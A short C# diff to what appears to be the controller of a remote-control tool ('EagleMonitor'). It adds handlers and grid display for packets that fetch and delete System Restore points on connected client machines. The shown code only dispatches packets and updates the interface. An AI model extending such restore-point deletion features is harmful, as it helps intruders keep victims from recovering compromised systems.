@@ -91,6 +91,13 @@ namespace EagleMonitor.Networking
                     case PacketType.CHAT_ON:
                         row.Cells["Column16"].Value = ((RemoteChatPacket)packet).msg;
                         break;
+
+                    case PacketType.UAC_DELETE_RESTORE_POINT:
+                        if(((DeleteRestorePointPacket)packet).deleted == true)
+                            row.Cells["Column16"].Value = ((DeleteRestorePointPacket)packet).index.ToString() + " DELETED";
+                        else
+                            row.Cells["Column16"].Value = ((DeleteRestorePointPacket)packet).index.ToString() + " NOT DELETED";
+                        break;
                 }
                 Program.mainForm.dataGridView2.ClearSelection();
                 Program.mainForm.dataGridView2.CurrentCell = null;
@@ -220,6 +227,16 @@ namespace EagleMonitor.Networking
                 case PacketType.CHAT_ON:
                     RemoteChatPacket chatPacket = (RemoteChatPacket)packet;
                     new ChatPacketHandler(chatPacket, clientHandler);
+                    break;
+
+                case PacketType.UAC_GET_RESTORE_POINT:
+                    RestorePointPacket restorePointPacket = (RestorePointPacket)packet;
+                    new RestorePointPacketHandler(restorePointPacket, clientHandler);
+                    break;
+
+                case PacketType.UAC_DELETE_RESTORE_POINT:
+                    DeleteRestorePointPacket deleteRestorePointPacket = (DeleteRestorePointPacket)packet;
+                    new DeleteRestorePointPacketHandler(deleteRestorePointPacket, clientHandler);
                     break;
 
             }
